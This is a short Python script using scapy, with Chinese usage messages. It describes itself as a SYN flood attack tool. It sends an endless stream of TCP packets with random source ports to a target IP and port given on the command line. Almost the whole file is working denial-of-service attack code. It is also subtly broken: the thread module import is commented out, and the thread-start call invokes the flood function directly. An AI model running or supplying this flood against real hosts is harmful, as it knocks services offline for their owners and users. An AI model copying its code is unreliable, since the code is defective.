#-*- coding:utf-8 -*-

from scapy.all import *
from time import sleep
#import thread
import random
import logging

from scapy.layers.inet import TCP
from scapy.layers.inet import IP

logging.getLogger('scapy.runtime').setLevel(logging.ERROR)

if len(sys.argv) !=4:
    print("用法： ./syn_flood.py [IP地址] [端口] [线程数]")
    print("举例： ./syn_flood.py 172.26.159.30 80 20")
    sys.exit()

target = str(sys.argv[1])
prot = int(sys.argv[2])
threads = int(sys.argv[3])

print("正在执行 SYN flood 攻击. 按 Ctrl+C 停止攻击")
def synflood(target,prot):
    while 0 == 0 :
        x = random.randint(0,65535)
        send(IP(dst=target)/TCP(dport=prot,sport=x),verbose=0)


for x in range(0,threads):
    thread.start_new_thread(synflood(target,prot))

while 0 == 0 :
    sleep(1)































